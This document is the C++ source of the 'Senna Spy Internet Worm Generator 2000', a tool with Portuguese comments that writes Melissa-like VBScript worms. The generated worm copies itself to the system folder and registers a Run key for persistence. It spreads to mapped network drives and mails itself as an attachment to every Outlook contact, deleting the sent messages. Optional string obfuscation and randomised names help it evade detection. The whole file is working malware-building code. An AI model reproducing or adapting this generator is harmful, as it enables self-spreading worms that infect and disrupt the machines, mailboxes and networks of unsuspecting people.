//////////////////////////////////////////////////////////
//                                                      //
// Senna Spy Internet Worm Generator 2000               //
// --------------------------------------               //
//                                                      //
// Primeiro Gerador de Worms para Internet do Mundo!    //
// Gera o Source Code de um Worm em VBScript.           //
//                                                      //
// O Codigo gerado, podera ser inserido em um Codigo    // 
// HTML ou executado diretamente com um Duplo-Clique.   //
//                                                      //
// Os Worms gerados, serao automaticamente enviados     //
// para todos os e-mails cadastrados no OutLook,        //
// ou seja, uma copia de si mesmo, sera anexada         //
// automaticamente, fazendo a contaminacao instantanea. //
//                                                      //
// O codigo trabalha como um "Virus Melissa-like".      //
//                                                      //
// History:                                             //
//                                                      //
//    Versao 1.0:  Sexta-Feira, 18 de Fevereiro de 2000 //
//                                                      //
//////////////////////////////////////////////////////////

#include <vcl.h>
#include "formmain.h"
#include "stdlib.h"

// Definicoes
#define  RAND_NOME_ROTINA_DECRIPTOGRAFIA  0
#define  RAND_ROTINA_DECRIPTOGRAFIA       1
#define  RAND_NOME_ARQUIVO_WORM           2

#define  TOTAL_ITENS                      2

// Variaveis Randomicas que Serao Usadas no Source do Worm
#define  RAND_VARIAVEL_01                 (      TOTAL_ITENS + 1 )
#define  RAND_VARIAVEL_02                 ( RAND_VARIAVEL_01 + 1 )
#define  RAND_VARIAVEL_03                 ( RAND_VARIAVEL_02 + 1 )
#define  RAND_VARIAVEL_04                 ( RAND_VARIAVEL_03 + 1 )
#define  RAND_VARIAVEL_05                 ( RAND_VARIAVEL_04 + 1 )
#define  RAND_VARIAVEL_06                 ( RAND_VARIAVEL_05 + 1 )
#define  RAND_VARIAVEL_07                 ( RAND_VARIAVEL_06 + 1 )
#define  RAND_VARIAVEL_08                 ( RAND_VARIAVEL_07 + 1 )
#define  RAND_VARIAVEL_09                 ( RAND_VARIAVEL_08 + 1 )
#define  RAND_VARIAVEL_10                 ( RAND_VARIAVEL_09 + 1 )
#define  RAND_VARIAVEL_11                 ( RAND_VARIAVEL_10 + 1 )
#define  RAND_VARIAVEL_12                 ( RAND_VARIAVEL_11 + 1 )
#define  RAND_VARIAVEL_13                 ( RAND_VARIAVEL_12 + 1 )
#define  RAND_VARIAVEL_14                 ( RAND_VARIAVEL_13 + 1 )

#define  RAND_TOTAL                       RAND_VARIAVEL_14
#define  RAND_GERAL                       ( TOTAL_ITENS + RAND_TOTAL + 1 )


//////////////////////////////////////////////////////////////////////////////////////
//                                                                                  //
// RAND_NOME_ROTINA_CRIPTOGRAFIA:                                                   //
//                                                                                  //
//    Nome da Rotina de Criptografia                                                //
//       - Maximo de 8 Caracteres - Somente Letras e Numeros                        //
//                                                                                  //
// RAND_ROTINA_CRIPTOGRAFIA:                                                        // 
//                                                                                  //
//    Tipo de Rotina de Criptografia que Sera Usada na Criacao dos Sources do Worm: //
//       - 0 = Nenhuma Criptografia                                                 //
//       - 1 = Rotina String Normal Invertida                                       //
//       - 2 = Rotina ASC() + 1 Normal                                              //
//       - 3 = Rotina ASC() + 1 Invertida                                           //
//       - 4 = Rotina ASC() - 1 Normal                                              //
//       - 5 = Rotina ASC() - 1 Invertida                                           //
//                                                                                  //
// RAND_NOME_ARQUIVO_WORM:                                                          //
//                                                                                  //
//    Nome Randomico do Worm:                                                       //
//       - Maximo de 8 Caracteres - Somente Letras e Numeros                        //
//                                                                                  //
// RAND_VARIAVEL_01 a RAND_VARIAVEL_XX:                                             //
//                                                                                  //
//    Nome Randomico das Variaveis de Uso Geral do Worm                             //
//       - Maximo de 8 Caracteres - Somente Letras e Numeros                        //
//                                                                                  //
//////////////////////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////
//                                                                            //
// GerarDadosRandomicos() - Gera os Dados Randomicos que Serao Usados no Worm //
//                                                                            //
////////////////////////////////////////////////////////////////////////////////

static void GerarDadosRandomicos( TStringList * MyRandomList )
{
    // Variaveis
    AnsiString cElemento;

    int nTamanho;

    int nLoop2;
    int nLoop;

    int nRand;

    // Cria Elementos Vazios
    for( nLoop = 0; nLoop < RAND_GERAL; nLoop ++ )
    {
         // Processa Eventos
         Application->ProcessMessages();

         // Somente para Itens Vazios
         if( MyRandomList->Strings[ nLoop ].IsEmpty() )
         {
             // Verifica se o Item a Ser Preenchido eh a Rotina de Criptografia
             if( nLoop == RAND_ROTINA_DECRIPTOGRAFIA )
             {
                 // Escolhe o Tipo de Rotina de Criptografia - de 1 a 5
                 do
                 {
                    nRand = random( 6 );
                 }
                 while( nRand < 1 || nRand > 5 );

                 // Define Qual Sera a Rotina de Decriptografia
                 MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] = IntToStr( nRand );
             }
             // Para os Outros Elementos...
             else
             {
                 // Obtem o Tamanho da Variavel
                 do
                 {
                    nTamanho = random( 9 );
                 }
                 while( nTamanho < 3 || nTamanho > 8 );

                 // Obtem o Primeiro Caracter - Deve ser Letra
                 do
                 {
                    nRand = random( 91 );
                 }
                 while( nRand < 'A' || nRand > 'Z' );

                 // Preenche Variavel
                 cElemento = AnsiString( (char) nRand );

                 // Gera Letra de Cada Variavel
                 for( nLoop2 = 1; nLoop2 < nTamanho; nLoop2 ++ )
                 {
                      // Obtem Letras e Numeros Somente
                      while( true )
                      {
                         nRand = random( 91 );

                         // Somente Caracteres Validos
                         if( ( nRand >= '0' && nRand <= '9' ) ||
                             ( nRand >= 'A' && nRand <= 'Z' ) )
                         {
                             break;
                         }
                      }

                      // Preenche Elemento
                      cElemento = cElemento + AnsiString( (char) nRand );
                 }

                 // Nao Podem Existir Elementos Repetidos...
                 if( MyRandomList->IndexOf( cElemento ) == -1 )
                     MyRandomList->Strings[ nLoop ] = cElemento;
                 else
                     GerarDadosRandomicos( MyRandomList );
             }
         }
    }
}


//////////////////////////////////////////
//                                      //
// Criptografa() - Criptografa os Dados //
//                                      //
//////////////////////////////////////////

AnsiString Criptografa( TStringList * MyRandomList, char * cDados )
{
   AnsiString cNovosDados = "";

   unsigned int nLoop;

   // Verifica a Rotina de Criptografia
   if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "0" )
   {
       return( "\"" + AnsiString( cDados ) + "\"" );
   }
   // Rotina Tipo 1 - String Normal Invertida
   else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "1" )
   {
       for( nLoop = 0; nLoop < strlen( cDados ); nLoop ++ )
            cNovosDados = AnsiString( (char) cDados[ nLoop ] ) + cNovosDados;
   }
   // Rotina Tipo 2 - Rotina ASC()+1 - Normal
   else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "2" )
   {
       for( nLoop = 0; nLoop < strlen( cDados ); nLoop ++ )
            cNovosDados = cNovosDados + AnsiString( (char) (cDados[ nLoop ] + 1) );
   }
   // Rotina Tipo 3 - Rotina ASC()+1 - Invertida
   else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "3" )
   {
       for( nLoop = 0; nLoop < strlen( cDados ); nLoop ++ )
            cNovosDados = AnsiString( (char) (cDados[ nLoop ] + 1) ) + cNovosDados;
   }
   // Rotina Tipo 4 - Rotina ASC()-1 - Normal
   else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "4" )
   {
       for( nLoop = 0; nLoop < strlen( cDados ); nLoop ++ )
            cNovosDados = cNovosDados + AnsiString( (char) (cDados[ nLoop ] - 1) );
   }
   // Rotina Tipo 5 - Rotina ASC()-1 - Invertida
   else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "5" )
   {
       for( nLoop = 0; nLoop < strlen( cDados ); nLoop ++ )
            cNovosDados = AnsiString( (char) (cDados[ nLoop ] - 1) ) + cNovosDados;
   }

   // Retorno
   return( MyRandomList->Strings[ RAND_NOME_ROTINA_DECRIPTOGRAFIA ] + "( \"" + cNovosDados + "\" )" );
}


//////////////////////////////////////////////////
//                                              //
// GeraWormVBScript() - Gera o Worm em VBScript //
//                                              //
//////////////////////////////////////////////////

void GeraWormVBScript( AnsiString cArquivo )
{
   // Variaveis
   AnsiString A01, A02, A03, A04, A08;
   AnsiString A06, A07, A05, A09, A10;
   AnsiString A11, A12, A13, A14;

   AnsiString WORM;

   unsigned int nLoop;

   // Criar Lista
   TStringList * MyRandomList = new TStringList();

      // Cria Elementos Vazios
      for( nLoop = 0; nLoop < RAND_GERAL; nLoop ++ )
           MyRandomList->Add( "" );

      // Verifica a Rotina de Criptografia
      if( FormWorm->CheckCrypt->Checked )
      {
          // Gera os Dados Randomicos
          GerarDadosRandomicos( MyRandomList );
      }
      else
      {
          MyRandomList->Strings[ RAND_NOME_ROTINA_DECRIPTOGRAFIA ] = "DECRYPT";
          MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA      ] = "0";
          MyRandomList->Strings[ RAND_NOME_ARQUIVO_WORM          ] = "SENNASPY";
          MyRandomList->Strings[ RAND_VARIAVEL_01                ] = "A01";
          MyRandomList->Strings[ RAND_VARIAVEL_02                ] = "A02";
          MyRandomList->Strings[ RAND_VARIAVEL_03                ] = "A03";
          MyRandomList->Strings[ RAND_VARIAVEL_04                ] = "A04";
          MyRandomList->Strings[ RAND_VARIAVEL_05                ] = "A05";
          MyRandomList->Strings[ RAND_VARIAVEL_06                ] = "A06";
          MyRandomList->Strings[ RAND_VARIAVEL_07                ] = "A07";
          MyRandomList->Strings[ RAND_VARIAVEL_08                ] = "A08";
          MyRandomList->Strings[ RAND_VARIAVEL_09                ] = "A09";
          MyRandomList->Strings[ RAND_VARIAVEL_10                ] = "A10";
          MyRandomList->Strings[ RAND_VARIAVEL_11                ] = "A11";
          MyRandomList->Strings[ RAND_VARIAVEL_12                ] = "A12";
          MyRandomList->Strings[ RAND_VARIAVEL_13                ] = "A13";
          MyRandomList->Strings[ RAND_VARIAVEL_14                ] = "A14";
      }

      // Criar Lista
      TStringList * MyList = new TStringList();

         // Obtem os Nomes das Variaveis Randomicas
         A01  = MyRandomList->Strings[ RAND_VARIAVEL_01 ];
         A02  = MyRandomList->Strings[ RAND_VARIAVEL_02 ];
         A03  = MyRandomList->Strings[ RAND_VARIAVEL_03 ];
         A04  = MyRandomList->Strings[ RAND_VARIAVEL_04 ];
         A08  = MyRandomList->Strings[ RAND_VARIAVEL_05 ];
         A06  = MyRandomList->Strings[ RAND_VARIAVEL_06 ];
         A07  = MyRandomList->Strings[ RAND_VARIAVEL_07 ];
         A05  = MyRandomList->Strings[ RAND_VARIAVEL_08 ];
         A09  = MyRandomList->Strings[ RAND_VARIAVEL_09 ];
         A10  = MyRandomList->Strings[ RAND_VARIAVEL_10 ];
         A11  = MyRandomList->Strings[ RAND_VARIAVEL_11 ];
         A12  = MyRandomList->Strings[ RAND_VARIAVEL_12 ];
         A13  = MyRandomList->Strings[ RAND_VARIAVEL_13 ];
         A14  = MyRandomList->Strings[ RAND_VARIAVEL_14 ];

         WORM = MyRandomList->Strings[ RAND_NOME_ARQUIVO_WORM ] + ".VBS";

         // Cria o Worm
         MyList->Add( "' " + FormWorm->EditWormName->Text.Trim() );
         MyList->Add( "" );
         MyList->Add( "On Error Resume Next" );
         MyList->Add( "" );
         MyList->Add( "Dim " + A01 );
         MyList->Add( "Dim " + A02 );

         if( FormWorm->CheckNetwork->Checked )
         {
             MyList->Add( "Dim " + A03 );
             MyList->Add( "Dim " + A04 );
             MyList->Add( "Dim " + A05 );
         }

         MyList->Add( "Dim " + A06 );
         MyList->Add( "Dim " + A07 );
         MyList->Add( "Dim " + A08 );
         MyList->Add( "Dim " + A09 );
         MyList->Add( "Dim " + A10 );
         MyList->Add( "" );
         MyList->Add( "Set " + A01 + " = CreateObject( " + Criptografa( MyRandomList, "Scripting.FileSystemObject" ) + " )" );
         MyList->Add( A01 + ".CopyFile WScript.ScriptFullName, " + A01 + ".BuildPath( " + A01 + ".GetSpecialFolder(1), " + Criptografa( MyRandomList, WORM.c_str() ) + " )" );
         MyList->Add( "" );
         MyList->Add( "Set " + A02 + " = CreateObject( " + Criptografa( MyRandomList, "WScript.Shell" ) + " )" );
         MyList->Add( A02 + ".RegWrite " +
                            Criptografa( MyRandomList, "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" ) +
                            " & " +
                            Criptografa( MyRandomList, MyRandomList->Strings[ RAND_NOME_ARQUIVO_WORM ].c_str() ) +
                            ", " +
                            A01 + ".BuildPath( " + A01 + ".GetSpecialFolder(1), " + Criptografa( MyRandomList, WORM.c_str() ) + " )" );
         MyList->Add( "" );

         // Somente se a Opcao de Rede Estiver Selecionada
         if( FormWorm->CheckNetwork->Checked )
         {
             MyList->Add( "" );
             MyList->Add( "Set " + A03 + " = CreateObject( " + Criptografa( MyRandomList, "WScript.Network" ) + " )" );
             MyList->Add( "Set " + A05 + " = " + A03 + ".EnumNetworkDrives" );
             MyList->Add( "" );
             MyList->Add( "If " + A05 + ".Count <> 0 Then" );
             MyList->Add( "   For " + A04 + " = 0 To " + A05 + ".Count - 1" );
             MyList->Add( "       If InStr( " + A05 + ".Item( " + A04 + "), " + Criptografa( MyRandomList, "\\" ) + " ) <> 0 Then" );
             MyList->Add( "          " + A01 + ".CopyFile WScript.ScriptFullName, " + A01 + ".BuildPath( " + A05 + ".Item( " + A04 + "), " + Criptografa( MyRandomList, WORM.c_str() ) + " ) " );
             MyList->Add( "       End If" );
             MyList->Add( "   Next" );
             MyList->Add( "End If" );
             MyList->Add( "" );
         }

         MyList->Add( A04 + " = " + A02 + ".RegRead( " + Criptografa( MyRandomList, "HKEY_LOCAL_MACHINE\\" ) +
                                                         " & " +
                                                         Criptografa( MyRandomList, MyRandomList->Strings[ RAND_NOME_ARQUIVO_WORM ].c_str() ) +
                                                         " )" );
         MyList->Add( "" );
         MyList->Add( "If " + A04 + " = \"\" Or " + A04 + " > 20 Then" );
         MyList->Add( "   " + A04 + " = 0" );
         MyList->Add( "End If" );
         MyList->Add( "" );
         MyList->Add( "If " + A04 + " = 0 Then" );
         MyList->Add( "   Set " + A08 + " = CreateObject( " + Criptografa( MyRandomList, "Outlook.Application" ) + " )" );
         MyList->Add( "   Set " + A06 + " = " + A08 + ".GetNameSpace( " + Criptografa( MyRandomList, "MAPI" ) + " )" );
         MyList->Add( "" );
         MyList->Add( "   For Each " + A07 + " In " + A06 + ".AddressLists" );
         MyList->Add( "       Set " + A05 + " = " + A08 + ".CreateItem( 0 )" );
         MyList->Add( "" );
         MyList->Add( "       For " + A09 + " = 1 To " + A07 + ".AddressEntries.Count" );
         MyList->Add( "           Set " + A10 + " = " + A07 + ".AddressEntries( " + A09 + " )" );
         MyList->Add( "" );
         MyList->Add( "           If " + A09 + " = 1 Then" );
         MyList->Add( "              " + A05 + ".BCC = " + A10 + ".Address" );
         MyList->Add( "           Else" );
         MyList->Add( "              " + A05 + ".BCC = " + A05 + ".BCC & " + Criptografa( MyRandomList, "; " ) + " & " + A10 + ".Address" );
         MyList->Add( "           End If" );
         MyList->Add( "       Next" );
         MyList->Add( "" );
         MyList->Add( "       " + A05 + ".Subject = " + Criptografa( MyRandomList, FormWorm->EditSubject->Text.Trim().c_str() ) );
         MyList->Add( "       " + A05 + ".Body = " + Criptografa( MyRandomList, FormWorm->EditMessage->Text.Trim().c_str() ) );
         MyList->Add( "       " + A05 + ".Attachmets.Add WScript.ScriptFullName" );
         MyList->Add( "       " + A05 + ".DeleteAfterSubmit = True" );
         MyList->Add( "       " + A05 + ".Send" );
         MyList->Add( "   Next" );
         MyList->Add( "" );
         MyList->Add( "   " + A04 + " = 0" );
         MyList->Add( "End If" );
         MyList->Add( "" );
         MyList->Add( A02 + ".RegWrite " + Criptografa( MyRandomList, "HKEY_LOCAL_MACHINE\\" ) +
                                           " & " +
                                           Criptografa( MyRandomList, MyRandomList->Strings[ RAND_NOME_ARQUIVO_WORM ].c_str() ) +
                                           ", " + A04 + " + 1" );
         MyList->Add( "" );

         // Somente se a Opcao de Criptografia Estiver Selecionada
         if( FormWorm->CheckCrypt->Checked )
         {
             MyList->Add( "Function " + MyRandomList->Strings[ RAND_NOME_ROTINA_DECRIPTOGRAFIA ] + "( " + A11 + " )" );
             MyList->Add( "   Dim " + A12 );
             MyList->Add( "   Dim " + A13 );
             MyList->Add( "   Dim " + A14 );
             MyList->Add( "" );
             MyList->Add( "   " + A12 + " = \"\"" );
             MyList->Add( "" );
             MyList->Add( "   For " + A13 + " = 1 To Len( " + A11 + " )" );
             MyList->Add( "       " + A14 + " = Mid( " + A11 + ", " + A13 + ", 1 )" );
             MyList->Add( "" );

             // Rotina Tipo 1 - String Normal Invertida
             if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "1" )
             {
                 MyList->Add( "       " + A12 + " = " + A14 + " & " + A12 );
             }
             // Rotina Tipo 2 - Rotina ASC()+1 - Normal
             else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "2" )
             {
                 MyList->Add( "       " + A12 + " = " + A12 + " & Chr( Asc( " + A14 + " ) - 1 )" );
             }
             // Rotina Tipo 3 - Rotina ASC()+1 - Invertida
             else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "3" )
             {
                 MyList->Add( "       " + A12 + " = Chr( Asc( " + A14 + " ) - 1 ) & " + A12 );
             }
             // Rotina Tipo 4 - Rotina ASC()-1 - Normal
             else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "4" )
             {
                 MyList->Add( "       " + A12 + " = " + A12 + " & Chr( Asc( " + A14 + " ) + 1 )" );
             }
             // Rotina Tipo 5 - Rotina ASC()-1 - Invertida
             else if( MyRandomList->Strings[ RAND_ROTINA_DECRIPTOGRAFIA ] == "5" )
             {
                 MyList->Add( "       " + A12 + " = Chr( Asc( " + A14 + " ) + 1 ) & " + A12 );
             }

             MyList->Add( "   Next" );
             MyList->Add( "" );
             MyList->Add( "   " + MyRandomList->Strings[ RAND_NOME_ROTINA_DECRIPTOGRAFIA ] + " = " + A12 );
             MyList->Add( "End Function" );
         }

         // Gravar o Source do Worm
         MyList->SaveToFile( cArquivo );

      // Libera Memoria
      delete MyList;
    
   // Libera Memoria
   delete MyRandomList;
}

